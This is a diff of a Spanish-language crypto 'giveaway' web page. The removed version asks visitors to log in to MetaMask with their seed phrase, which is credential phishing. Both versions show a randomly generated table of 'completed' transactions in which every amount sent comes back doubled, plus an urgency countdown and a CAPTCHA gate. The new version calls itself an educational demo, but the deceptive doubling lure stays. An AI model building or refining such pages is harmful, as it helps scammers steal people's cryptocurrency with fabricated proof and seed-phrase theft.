@@ -2,99 +2,57 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <title>CryptoGift - Duplica tus Criptomonedas</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Evento de Criptomonedas</title>
+  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   <style>
-    
     body {
-      <script>
-  function onCaptchaSuccess(response) {
-    // Verifica el CAPTCHA con tu backend (opcional pero recomendado para seguridad)
-    fetch('/verify-captcha', {
-      method: 'POST',
-      body: JSON.stringify({ captchaResponse: response }),
-      headers: { 'Content-Type': 'application/json' }
-    })
-    .then(res => res.json())
-    .then(data => {
-      if (data.success) {
-        window.location.href = "/home"; // Redirige a la ruta deseada
-      } else {
-        alert("¡CAPTCHA fallido! Intenta nuevamente.");
-        grecaptcha.reset(); // Reinicia el CAPTCHA
-      }
-    });
-  }
-</script>
       background-color: #0b0c10;
       color: #fff;
       font-family: Arial, sans-serif;
       text-align: center;
-      padding: 50px 15px;
+      padding: 20px 15px;
       margin: 0;
     }
     .container {
       max-width: 600px;
       margin: auto;
       background-color: #1f2833;
-      padding: 30px;
+      padding: 25px;
       border-radius: 10px;
-      box-shadow: 0 0 20px rgba(0,255,0,0.2);
+      box-shadow: 0 0 15px rgba(0,255,0,0.1);
     }
     h1 {
       margin-top: 0;
       margin-bottom: 20px;
+      color: #66fcf1;
+      font-size: 24px;
     }
     p {
-      margin-bottom: 25px;
+      margin-bottom: 20px;
       line-height: 1.4;
-    }
-    form {
-      margin-bottom: 25px;
-    }
-    input[type="text"] {
-      width: 100%;
-      padding: 12px;
       font-size: 14px;
-      border: none;
-      border-radius: 6px;
-      margin-bottom: 15px;
-      box-sizing: border-box;
     }
-    input[type="text"]:focus {
-      outline: none;
-      box-shadow: 0 0 5px #66fcf1;
-    }
-    .btn-login {
-      width: 100%;
-      padding: 12px;
-      background-color: #66fcf1;
-      border: none;
-      border-radius: 6px;
-      font-size: 16px;
-      cursor: pointer;
-      color: #0b0c10;
-      font-weight: bold;
-      transition: background-color 0.3s ease;
-    }
-    .btn-login:hover {
-      background-color: #45a29e;
-      color: white;
+    .recaptcha-container {
+      margin: 20px 0;
+      display: flex;
+      justify-content: center;
     }
     .timer {
-      font-size: 20px;
+      font-size: 18px;
       color: #66fcf1;
       margin-bottom: 20px;
+      font-weight: bold;
     }
     table {
       width: 100%;
-      margin-top: 20px;
+      margin: 20px 0;
       border-collapse: collapse;
-      word-break: break-word; /* Aquí para que las direcciones no se salgan */
+      font-size: 12px;
     }
     th, td {
       border: 1px solid #66fcf1;
-      padding: 8px 10px;
-      font-size: 14px;
+      padding: 8px;
       text-align: center;
     }
     th {
@@ -104,72 +62,86 @@
     tr:nth-child(even) {
       background-color: #16222a;
     }
-    tr td:nth-child(1) {
-      max-width: 150px;
-      word-wrap: break-word;
-    }
     footer {
-      margin-top: 30px;
-      font-size: 12px;
+      margin-top: 25px;
+      font-size: 11px;
       color: #ccc;
+    }
+    .warning {
+      color: #ff5555;
+      font-size: 12px;
+      margin: 15px 0;
+      padding: 10px;
+      border: 1px solid #ff5555;
+      border-radius: 5px;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>🎁 ¡Evento Especial de Regalo de Ethereum!</h1>
-    <p>Inicie sesión con Metamask con su frase semilla. <strong>Debe tener al menos 0.01 ETH o 10 ETH.</strong> Vea nuestras referencias y clientes satisfechos en nuestro canal de Telegram:</p>
-<div class="recaptcha-container">
-  <div id="captcha" class="g-recaptcha" data-sitekey="6LcCpmArAAAAAIUzkdT0OnIvBvDnfuMMdJVZV-dw" data-callback="onCaptchaSuccess"></div>
-</div>
+    <h1>¡Evento Especial de Criptomonedas!</h1>
+    
+    <p>Complete el CAPTCHA para verificar su identidad y acceder al contenido.</p>
+    
+    <div class="recaptcha-container">
+      <div class="g-recaptcha" data-sitekey="6LcCpmArAAAAAIUzkdT0OnIvBvDnfuMMdJVZV-dw" data-callback="onCaptchaSuccess"></div>
+    </div>
+    
     <div class="timer">
-      Tiempo restante para participar: <span id="countdown">01:59:00</span>
+      Tiempo restante: <span id="countdown">01:59:00</span>
     </div>
 
-<h2>Últimas Transacciones</h2>
-  <table>
-    <thead>
-      <tr>
-        <th>Dirección</th>
-        <th>Cantidad Enviada</th>
-        <th>Cantidad Recibida</th>
-        <th>Estado</th>
-      </tr>
-    </thead>
-    <tbody id="transaccionesBody"></tbody>
-  </table>
+    <h2>Últimas Transacciones</h2>
+    <table>
+      <thead>
+        <tr>
+          <th>Dirección</th>
+          <th>Enviado</th>
+          <th>Recibido</th>
+          <th>Estado</th>
+        </tr>
+      </thead>
+      <tbody id="transaccionesBody"></tbody>
+    </table>
 
-  <footer>© 2025 CryptoGift Ltd. No afiliado con Ethereum Foundation.</footer>
+    <footer>
+      © 2025 Demo Crypto Ltd. Sitio de demostración educativa.
+    </footer>
+  </div>
 
   <script>
+    // Función para el CAPTCHA
+    function onCaptchaSuccess(response) {
+      // Simulación de verificación (en producción debe hacerse en backend)
+      setTimeout(() => {
+        window.location.href = "/home"; // Cambia por tu ruta real
+      }, 1000);
+    }
+
+    // Generador de transacciones
     function generarDireccion() {
       const chars = "abcdef0123456789";
       let dir = "0x";
       for (let i = 0; i < 4; i++) dir += chars[Math.floor(Math.random() * chars.length)];
-      dir += "...";
+      dir += "_";
       for (let i = 0; i < 4; i++) dir += chars[Math.floor(Math.random() * chars.length)];
       return dir;
     }
 
-    function generarCantidad(base = 0.1, max = 5) {
-      const cantidad = (Math.random() * max + base).toFixed(2);
-      return parseFloat(cantidad);
-    }
-
     function generarTransaccion() {
-      const enviada = generarCantidad(0.1, 5); // 0.1 a 5 ETH
-      const recibida = (enviada * 2).toFixed(2); // Ej: dobla la cantidad
+      const enviada = (Math.random() * 4 + 0.1).toFixed(2);
+      const recibida = (enviada * 2).toFixed(2);
       return {
         direccion: generarDireccion(),
         enviada: `${enviada} ETH`,
         recibida: `${recibida} ETH`,
-        estado: "✅ Completado"
+        estado: "Completado"
       };
     }
 
     function mostrarTransacciones(cantidad = 5) {
       const tbody = document.getElementById("transaccionesBody");
-      tbody.innerHTML = ""; // limpiar
+      tbody.innerHTML = "";
 
       for (let i = 0; i < cantidad; i++) {
         const tx = generarTransaccion();
@@ -185,29 +157,31 @@
       }
     }
 
-    // Inicia cuando carga la página
-    mostrarTransacciones();
-  </script>
-
-
-  <script>
+    // Temporizador
     function startCountdown(durationInSeconds) {
       let seconds = durationInSeconds;
       const countdown = document.getElementById('countdown');
 
-      setInterval(() => {
-        if (seconds > 0) {
-          seconds--;
-          const hours = String(Math.floor((seconds % 86400) / 3600)).padStart(2, '0');
-          const minutes = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
-          const sec = String(seconds % 60).padStart(2, '0');
-          countdown.textContent = `${hours}:${minutes}:${sec}`;
+      const interval = setInterval(() => {
+        if (seconds <= 0) {
+          clearInterval(interval);
+          countdown.textContent = "00:00:00";
+          return;
         }
+        
+        seconds--;
+        const hours = String(Math.floor(seconds / 3600)).padStart(2, '0');
+        const minutes = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
+        const sec = String(seconds % 60).padStart(2, '0');
+        countdown.textContent = `${hours}:${minutes}:${sec}`;
       }, 1000);
     }
 
-    const duration = (1 * 60 * 60) + (59 * 60); // 1 hora 59 minutos
-    startCountdown(duration);
+    // Inicialización
+    document.addEventListener('DOMContentLoaded', () => {
+      mostrarTransacciones();
+      startCountdown((1 * 60 * 60) + (59 * 60)); // 1 hora 59 minutos
+    });
   </script>
 </body>
 </html>
